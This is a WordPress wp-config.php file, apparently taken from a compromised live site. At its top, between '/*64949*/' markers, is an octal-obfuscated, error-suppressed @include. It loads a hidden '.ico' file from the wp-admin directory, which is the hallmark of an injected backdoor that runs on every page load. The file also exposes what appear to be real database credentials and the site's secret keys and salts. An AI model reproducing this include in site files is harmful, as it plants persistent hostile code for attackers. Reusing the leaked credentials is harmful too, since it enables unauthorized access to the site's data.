<?php
/*64949*/

@include "\057h\163p\150e\162e\057l\157c\141l\057h\157m\145/\150b\0634\0679\0632\0665\063/\165n\151c\157l\154a\162.\163e\057w\160-\141d\155i\156/\156e\164w\157r\153/\0566\0608\0663\1418\145.\151c\157";

/*64949*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */

//define('DB_NAME', 'unicollar'); //localhost
define('DB_NAME', 'hb34793_wordpress'); //live

/** MySQL database username */
//define('DB_USER', 'root'); //localhost
define('DB_USER', 'hb34793_wordpre'); //live

/** MySQL database password */
//define('DB_PASSWORD', 'root'); //localhost
define('DB_PASSWORD', 'Iu=EpjuL]b'); //live

/** MySQL hostname */
//define('DB_HOST', 'localhost'); //localhost
define('DB_HOST', 'mydbb6.surf-town.net'); //live

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4'); //localhost
//define('DB_CHARSET', 'utf8'); //live

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', ''); //localhost
//define('DB_COLLATE', ''); //live

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '6c($QCl.>8(D-E)%24:@827F*T{l:7)Ea ti8dM>xT=h!p}1!bQp<&>z[T;HOhcW');
define('SECURE_AUTH_KEY',  ';jbJFPri.mSjj-6Ck90_nI?n.?)1?VnP[ Xi}nw+m$==2S@*ot_.5.9K:7e93R=b');
define('LOGGED_IN_KEY',    'C96Y cZZ-9y.?/Rfx5J +tn_5NYflNK.f.@`HHcmxw$[[:oQGq|iy}:P|:Ia3&~@');
define('NONCE_KEY',        '$GY`Z lGR5W,7:JXL`If|#~s8lKv@:myC6SdNXg.HJ3O+#>4Yo3:i1*461Sph`=S');
define('AUTH_SALT',        'Xi[J #C_!*/#d[TEP;+@$R!V_`^~QP_Uo:9S#)$}jM]&y_$BR;NEXVy<PFnYaX?;');
define('SECURE_AUTH_SALT', '[Z0f%jrH-yk]j>i6E3$lVYMe-EDIqB><5w5)ls~B3s~DkyXSG$+t}Gf{Rso{Em>N');
define('LOGGED_IN_SALT',   'kKWrlI^nRp_`g5% 2% [2.%__evW-<0n.k`f,%cQ)i8s/b+vi^Eu2r^__@?b#s_L');
define('NONCE_SALT',       'De>LAS`#799,%$}2%3*C^Km]&or-1+2#nYAE? QL,xx,MBp5G{zRstIItWou~/nj');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
